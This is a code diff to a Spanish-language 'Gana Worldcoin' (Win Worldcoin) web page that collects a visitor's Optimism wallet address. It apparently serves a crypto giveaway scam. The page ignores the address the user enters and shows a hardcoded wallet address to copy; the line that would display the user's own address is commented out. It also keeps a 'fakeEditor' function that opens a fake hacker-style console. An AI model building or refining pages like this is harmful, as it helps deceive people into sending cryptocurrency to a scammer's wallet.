@@ -28,16 +28,13 @@
 <div id="game-container" style="display:none;">
     <h1>Gana Worldcoin</h1>
     <p>Jugar es muy sencillo</p>
-      <div id="worldcoin-dashboard">
-        <input type="text" id="worldcoinAddressInput" placeholder="Ingresa tu dirección de Optimism">
-
-<div id="fakeEditor" style="display:none; background-color: #1e1e1e; color: lime; padding: 10px; margin-top: 20px; width: 80%; height: 200px; overflow-y: scroll; font-family: 'Courier New', monospace; white-space: pre;"></div>
-
-          
-        <button id="copyAddress">Copiar Dirección</button>
-        <p id="providedAddress" style="display:none;">0x01C65F22A9478C2932e62483509c233F0aaD5c72</p>
-    </div>
+    <div id="worldcoin-dashboard">
+    <input type="text" id="worldcoinAddressInput" placeholder="Ingresa tu dirección de Optimism">
+    <button id="confirmAddress">Confirmar Dirección</button> <!-- Botón de confirmación agregado -->
+    <button id="copyAddress" style="display:none;">Copiar Dirección</button> <!-- Ocultar inicialmente -->
+    <p id="providedAddress" style="display:block;">0x01C65F22A9478C2932e62483509c233F0aaD5c72</p> <!-- Visible por defecto -->
 </div>
+
 
   <style>body {
     font-family: 'Arial', sans-serif;
@@ -226,15 +223,23 @@ span {
        inicializarContadores(); // Asegúrate de llamar esta función para inicializar los contadores
        
 
-    document.getElementById('copyAddress').addEventListener('click', function() {
-        // Obtiene la dirección de Optimism proporcionada y la copia al portapapeles
-        var providedAddress = document.getElementById('providedAddress').textContent;
-        navigator.clipboard.writeText(providedAddress).then(function() {
-            alert('Dirección copiada al portapapeles');
-        }, function(err) {
-            console.error('Error al copiar la dirección:', err);
-        });
-            mostrarFakeEditor();
+  document.getElementById('confirmAddress').addEventListener('click', function() {
+    const userAddress = document.getElementById('worldcoinAddressInput').value;
+    // Verifica si el usuario ha ingresado alguna dirección
+    if (userAddress.trim() !== "") {
+        // Muestra el botón para copiar la dirección y oculta el botón de confirmación
+        document.getElementById('copyAddress').style.display = 'block';
+        document.getElementById('confirmAddress').style.display = 'none';
+        
+        // Opcionalmente, puedes actualizar la dirección mostrada con la ingresada por el usuario
+        // document.getElementById('providedAddress').textContent = userAddress;
+        
+        alert('Dirección confirmada. Ahora puedes copiarla.');
+    } else {
+        alert('Por favor, ingresa una dirección.');
+    }
+});
+
 function mostrarFakeEditor() {
     const editor = document.getElementById('fakeEditor');
     editor.style.display = 'block';
